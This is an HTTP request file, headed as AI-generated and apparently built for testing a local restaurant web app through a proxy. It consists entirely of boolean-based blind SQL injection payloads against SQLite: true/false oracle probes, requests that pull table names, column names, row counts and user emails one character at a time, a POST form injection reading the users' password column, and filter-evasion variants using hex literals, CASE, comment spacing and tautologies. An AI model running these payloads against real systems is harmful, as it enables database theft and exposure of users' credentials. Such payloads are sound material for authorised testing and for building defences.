# AI GENERATED FROM THE boolean FOLDER (with some fixes)

@proxy = http://127.0.0.1:8080

### Oracle probe: condition true
GET {{proxy}}/restaurant?id=1 AND 1=1 --

### Oracle probe: condition false
GET {{proxy}}/restaurant?id=1 AND 1=2 --

### db_dumper: length of the table-name list
GET {{proxy}}/restaurant?id=1 AND (LENGTH((SELECT group_concat(name, '~') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%25' ORDER BY name))>40) --

### db_dumper: one character of the table-name list
GET {{proxy}}/restaurant?id=1 AND (UNICODE(SUBSTR((SELECT group_concat(name, '~') FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%25' ORDER BY name),3,1))>77) --

### db_dumper: column names of a table
GET {{proxy}}/restaurant?id=1 AND (UNICODE(SUBSTR((SELECT group_concat(name, '~') FROM pragma_table_info('users') ORDER BY cid),3,1))>77) --

### db_dumper: row count
GET {{proxy}}/restaurant?id=1 AND (LENGTH((SELECT COUNT(*) FROM "users"))>0) --

### db_dumper: one character of one row
GET {{proxy}}/restaurant?id=1 AND (UNICODE(SUBSTR((SELECT COALESCE(CAST("id" AS TEXT), 'NULL') || '|' || COALESCE(CAST("email" AS TEXT), 'NULL') FROM "users" LIMIT 1 OFFSET 0),3,1))>77) --

### Same extraction through the authenticated order lookup (POST form field)
POST {{proxy}}/order/lookup
Cookie: session=anything
Content-Type: application/x-www-form-urlencoded

order_id=1 AND (UNICODE(SUBSTR((SELECT password FROM users LIMIT 1),3,1))>77) --

### Evasion: hex literals, no comment marker, no SQL keyword
GET {{proxy}}/restaurant?id=1 AND 0x31=0x31

### Evasion: CASE instead of a comparison
GET {{proxy}}/restaurant?id=1 AND CASE WHEN (1=1) THEN 1 ELSE 0 END

### Evasion: /**/ in place of spaces
GET {{proxy}}/restaurant?id=1/**/AND/**/(SELECT/**/1)=1

### Evasion: subquery, no comment marker
GET {{proxy}}/restaurant?id=1 AND (SELECT COUNT(*) FROM users)>0

### Evasion: string tautology in a numeric context
GET {{proxy}}/restaurant?id=1 OR 'a'='a'
